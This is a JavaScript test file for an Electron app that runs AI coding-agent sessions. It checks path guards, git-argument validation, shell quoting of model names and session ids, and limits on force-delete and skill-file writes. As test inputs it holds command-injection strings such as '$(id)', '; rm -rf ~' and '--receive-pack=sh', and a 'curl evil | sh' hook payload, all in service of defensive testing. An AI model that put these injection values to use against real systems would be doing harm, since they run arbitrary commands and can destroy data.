require('../setup');
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { EventEmitter } = require('node:events');

const { testUserData } = require('../setup');
const pathGate = require('../../main/util/path-gate');
const guard = require('../../main/util/ipc-guard');
const { gitRef } = require('../../main/util/git-arg');
const { depthUnder, isSessionWorktreeDir } = require('../../main/util/session-paths');
const providers = require('../../main/state/ai-providers');

const tmp = (p) => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), p)));

// ---- the guard -----------------------------------------------------------------

test('a workspace argument must be one the app knows', () => {
  const known = (p) => p === '/known/repo';
  assert.equal(guard.refusal('git-status', [{ worktreePath: '/known/repo' }], known), null);
  assert.match(guard.refusal('git-status', [{ worktreePath: os.homedir() }], known), /worktreePath isn't a project/);
  assert.match(guard.refusal('switch-project', [{ projectPath: '/' }], known), /projectPath/);
  assert.match(guard.refusal('read-files-bulk', [{ worktreePath: { toString: () => '/known/repo' } }], known), /worktreePath/);
  assert.equal(guard.refusal('git-status', [{ worktreePath: '' }], known), null); // absent: the handler decides
  assert.equal(guard.refusal('list-projects', [], known), null);
  assert.equal(guard.refusal('attach-worktree', [{ worktreePath: '/new/worktree' }], known), null); // introduces one
});

test('install wraps every handler registered after it', async () => {
  const fake = new EventEmitter();
  const handlers = new Map();
  fake.handle = (ch, fn) => handlers.set(ch, fn);
  guard.install(fake);
  fake.handle('echo', (_e, a) => a.worktreePath);
  await assert.rejects(async () => handlers.get('echo')({}, { worktreePath: '/' }), /isn't a project or worktree/);
});

// ---- what counts as a known workspace --------------------------------------------

function withConfig(config, fn) {
  pathGate.setDeps({ loadConfig: () => config, getInstances: () => new Map() });
  try { return fn(); } finally { pathGate.setDeps({ loadConfig: () => ({}), getInstances: () => new Map() }); }
}

test('projects and folders inside them are known; home and / are not', () => {
  const project = tmp('maussian-project-');
  fs.mkdirSync(path.join(project, 'src'));
  withConfig({ projects: [{ path: project }] }, () => {
    assert.equal(pathGate.knownWorkspace(project), project);
    assert.equal(pathGate.knownWorkspace(path.join(project, 'src')), path.join(project, 'src'));
    assert.equal(pathGate.knownWorkspace(os.homedir()), null);
    assert.equal(pathGate.knownWorkspace('/'), null);
    assert.equal(pathGate.knownWorkspace(path.join(project, '..')), null);
    assert.equal(pathGate.knownWorkspace('relative/path'), null);
  });
});

test('a saved session counts even when its folder is gone', () => {
  const gone = path.join(os.tmpdir(), 'maussian-gone-' + Date.now());
  withConfig({ savedSessions: [{ worktreePath: gone }] }, () => {
    assert.equal(pathGate.knownWorkspace(gone), gone);
  });
});

// A worktree as git makes one: its .git file names the repo's record, and the
// record's gitdir file points back.
function linkWorktree(project, wt, name) {
  const rec = path.join(project, '.git', 'worktrees', name);
  fs.mkdirSync(rec, { recursive: true });
  fs.writeFileSync(path.join(rec, 'gitdir'), path.join(wt, '.git') + '\n');
  fs.writeFileSync(path.join(wt, '.git'), `gitdir: ${rec}\n`);
}

test('a git worktree of a known project is known wherever it lives; one of another repo is not', () => {
  const project = tmp('maussian-project-');
  const wt = tmp('maussian-wt-');
  linkWorktree(project, wt, 'feature');
  const stranger = tmp('maussian-wt-');
  linkWorktree(tmp('maussian-other-'), stranger, 'x');
  withConfig({ projects: [{ path: project }] }, () => {
    assert.equal(pathGate.knownWorkspace(wt), wt);
    assert.equal(pathGate.knownWorkspace(stranger), null);
  });
});

test('a .git file claiming a known project without the project\u2019s record pointing back is not known', () => {
  const project = tmp('maussian-project-');
  const claimer = tmp('maussian-claimer-');
  fs.mkdirSync(path.join(project, '.git', 'worktrees', 'real'), { recursive: true });
  fs.writeFileSync(path.join(project, '.git', 'worktrees', 'real', 'gitdir'), '/somewhere/else/.git\n');
  fs.writeFileSync(path.join(claimer, '.git'), `gitdir: ${path.join(project, '.git', 'worktrees', 'real')}\n`);
  withConfig({ projects: [{ path: project }] }, () => {
    assert.equal(pathGate.knownWorkspace(claimer), null);
  });
});

test('a worktree whose folder is gone is still known while its project registers it', () => {
  const project = tmp('maussian-project-');
  const gone = path.join(tmp('maussian-parent-'), 'deleted-wt');
  const rec = path.join(project, '.git', 'worktrees', 'deleted');
  fs.mkdirSync(rec, { recursive: true });
  fs.writeFileSync(path.join(rec, 'gitdir'), path.join(gone, '.git') + '\n');
  withConfig({ projects: [{ path: project }] }, () => {
    assert.equal(pathGate.knownWorkspace(gone), gone);
    assert.equal(pathGate.knownWorkspace(path.join(path.dirname(gone), 'never-existed')), null);
  });
});

test('every entry of a path list must be known', () => {
  const known = (p) => p.startsWith('/known/');
  assert.equal(guard.refusal('delete-session', [{ worktreePaths: ['/known/a', '/known/b'] }], known), null);
  assert.match(guard.refusal('delete-session', [{ worktreePaths: ['/known/a', os.homedir()] }], known), /worktreePaths/);
  assert.match(guard.refusal('delete-session', [{ worktreePaths: '/known/a' }], known), /worktreePaths/);
});

test('a recent folder that is home or above it is not a root', () => {
  withConfig({ recentPaths: { folders: [os.homedir(), '/', path.dirname(os.homedir())] } }, () => {
    const roots = pathGate.getRendererAllowedRoots();
    assert.ok(!roots.includes(os.homedir()));
    assert.ok(!roots.includes('/'));
    assert.equal(pathGate.pathUnderAnyRoot(path.join(os.homedir(), '.zshrc')), null);
  });
});

test('config.json is not reachable through the renderer roots; PR checkouts are', () => {
  fs.mkdirSync(path.join(testUserData, 'pr-checkouts', 'pr-1'), { recursive: true });
  fs.writeFileSync(path.join(testUserData, 'config.json'), '{}');
  withConfig({}, () => {
    assert.equal(pathGate.pathUnderAnyRoot(path.join(testUserData, 'config.json')), null);
    assert.ok(pathGate.pathUnderAnyRoot(path.join(testUserData, 'pr-checkouts', 'pr-1')));
  });
});

// ---- git arguments --------------------------------------------------------------------

test('a git ref can never become an option', () => {
  for (const ok of ['main', 'feat/x', 'v1.2.3', 'origin/main', 'abc123']) assert.equal(gitRef(ok), true, ok);
  for (const bad of ['--output=/Users/me/.zshrc', '--receive-pack=sh', '-c', 'a b', 'a\nb', '', null, 42]) {
    assert.equal(gitRef(bad), false, String(bad));
  }
});

// ---- the agent command line -----------------------------------------------------------

test('a model name with shell characters is dropped, and Claude’s model is quoted', () => {
  const claude = providers.getProvider('claude');
  assert.equal(claude.buildInteractiveCmd('claude', { model: 'opus[1m]' }), 'claude --model "opus[1m]"');
  assert.equal(claude.buildInteractiveCmd('claude', { model: 'opus";touch /tmp/x;"' }), 'claude');
  assert.equal(claude.buildInteractiveCmd('claude', { model: 'opus $(id)' }), 'claude');
  assert.equal(providers.getProvider('antigravity').buildInteractiveCmd('agy', { model: 'Gemini 3.5 Flash (Low)' }),
    'agy --model "Gemini 3.5 Flash (Low)"');
});

test('every agent quotes its model, and session dirs can\u2019t run $(...)', () => {
  const codex = providers.getProvider('codex');
  // Codex used to put the model in unquoted, where ';' needs no $ to run a command.
  assert.equal(codex.buildInteractiveCmd('codex', { model: 'gpt-5;touch /tmp/x' }), 'codex -m "gpt-5;touch /tmp/x"');
  assert.match(codex.buildInteractiveCmd('codex', { sessionDirs: ['/w/$(touch /tmp/x)'] }), /--add-dir '\/w\/\$\(touch \/tmp\/x\)'/);
  assert.equal(providers.safeModel('m%PATH%'), '');
});

test('a session id must be a plain id', () => {
  assert.equal(providers.safeSessionId('0b6f-uuid_1.2:3'), '0b6f-uuid_1.2:3');
  assert.equal(providers.safeSessionId('x; rm -rf ~'), null);
  const claude = providers.getProvider('claude');
  assert.equal(claude.buildInteractiveCmd('claude', { resumeSessionId: '$(id)' }), 'claude');
});

// ---- delete-session's force-delete fallback -----------------------------------------------

test('only <sessions>/<session>/<worktree> may be force-deleted, never via .. or a symlink', () => {
  const root = tmp('maussian-sessions-');
  const wt = path.join(root, 'session-a', 'repo');
  fs.mkdirSync(wt, { recursive: true });
  assert.equal(isSessionWorktreeDir(root, wt), true);
  assert.equal(isSessionWorktreeDir(root, path.join(root, 'session-a')), false); // a whole session
  assert.equal(isSessionWorktreeDir(root, root), false);
  assert.equal(isSessionWorktreeDir(root, path.join(root, '..', '..')), false);
  assert.equal(isSessionWorktreeDir(root, path.join(root, 'session-a', 'repo', '..', '..', '..')), false);
  fs.symlinkSync(os.homedir(), path.join(root, 'session-a', 'link'));
  assert.equal(isSessionWorktreeDir(root, path.join(root, 'session-a', 'link')), false);
  // A symlinked session folder: its child looks two deep but lives elsewhere.
  const elsewhere = tmp('maussian-elsewhere-');
  fs.mkdirSync(path.join(elsewhere, 'victim'));
  fs.symlinkSync(elsewhere, path.join(root, 'session-b'));
  assert.equal(isSessionWorktreeDir(root, path.join(root, 'session-b', 'victim')), false);
  assert.equal(depthUnder(root, path.join(root, 'a')), 1);
  assert.equal(depthUnder(root, path.join(root, '..', 'elsewhere')), 0);
});

// ---- skill files, through the real handlers ----------------------------------------

test('skill files: Markdown only for writing and opening, and nothing outside the skill folders', () => {
  const { electronStub } = require('../setup');
  const handlers = new Map();
  const realHandle = electronStub.ipcMain.handle;
  const skillsPath = require.resolve('../../main/ipc/skills');
  delete require.cache[skillsPath];
  electronStub.ipcMain.handle = (ch, fn) => handlers.set(ch, fn);
  try {
    require(skillsPath);
  } finally {
    electronStub.ipcMain.handle = realHandle;
  }
  const claude = path.join(os.homedir(), '.claude');
  const plugin = path.join(claude, 'plugins', 'demo');
  fs.mkdirSync(plugin, { recursive: true });
  fs.writeFileSync(path.join(plugin, 'SKILL.md'), '# demo\n');
  fs.writeFileSync(path.join(plugin, 'hook.sh'), 'echo hi\n');
  fs.writeFileSync(path.join(claude, 'settings.json'), '{}');

  const write = handlers.get('write-skill-file');
  const read = handlers.get('read-skill-file');
  const open = handlers.get('open-skill-file');
  assert.deepEqual(write({}, { filePath: path.join(plugin, 'SKILL.md'), content: '# edited\n' }), { ok: true });
  assert.match(write({}, { filePath: path.join(plugin, 'hook.sh'), content: 'curl evil | sh' }).error, /Only Markdown/);
  assert.equal(fs.readFileSync(path.join(plugin, 'hook.sh'), 'utf8'), 'echo hi\n');
  assert.match(write({}, { filePath: path.join(claude, 'settings.json'), content: '{"hooks":{}}' }).error, /outside/);
  assert.match(read({}, { filePath: path.join(claude, 'settings.json') }).error, /outside/);
  assert.match(open({}, { filePath: path.join(plugin, 'hook.sh') }).error, /Only Markdown/);
});
